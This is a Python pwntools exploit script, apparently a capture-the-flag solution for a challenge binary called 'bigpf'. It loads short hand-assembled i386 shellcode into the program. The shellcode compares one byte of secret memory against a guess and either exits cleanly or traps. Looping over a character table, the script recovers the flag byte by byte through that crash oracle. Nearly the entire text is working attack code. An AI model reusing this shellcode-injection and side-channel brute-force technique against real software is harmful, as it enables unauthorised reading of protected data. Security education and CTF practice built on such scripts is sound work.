#!/usr/bin/env python3
from pwn import *
import string

context.arch = 'i386'
context.log_level = 'warning'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./bigpf')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

def bruteforce(idx, ch):
    global p
    local = 1
    if local:
        p = process([elf.path])
    else:
        p = remote('localhost', 8888)

    sa('NAME PROGRAM\n', '0xb3a1e\n')

    """
    sh = asm('''
        mov al, [edi+{}]
        cmp al, {}
        je label
        int 3
    label:
        mov eax, 1
        xor ebx, ebx
        int 0x80
    '''.format(idx, ch))
    """
    sh = '\x8aG{}<{}t\x01\xcc\xb8\x01\x00\x00\x001\xdb\xcd\x80'.format(chr(idx), chr(ch))
    assert(len(sh) <= 0x200)
    #gdb.attach(p, 'set follow-fork-mode child\nb *0x56555ec6\nc')
    sa('LOAD PROGRAM\n', up32(len(sh)))

    #p.send(sh)
    s(sh)
    try:
        r = p.recv(timeout=0.01)
    except EOFError:
        r = ''
    finally:
        p.close()

        return r

#print(bruteforce(0, ord('f')))
#print(bruteforce(0, ord('l')))
#print(bruteforce(4, ord('{')))

flag = ''
idx = 0
target = b'THANK YOU'
#table = string.printable
table = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
while True:
    if bruteforce(idx, 0) == target:
        warning('Over')
        break
    else:
        warning('Not the end')
    for c in table:
        r = bruteforce(idx, ord(c))
        if r == target:
            flag += c
            idx += 1
            warning(flag)
            break

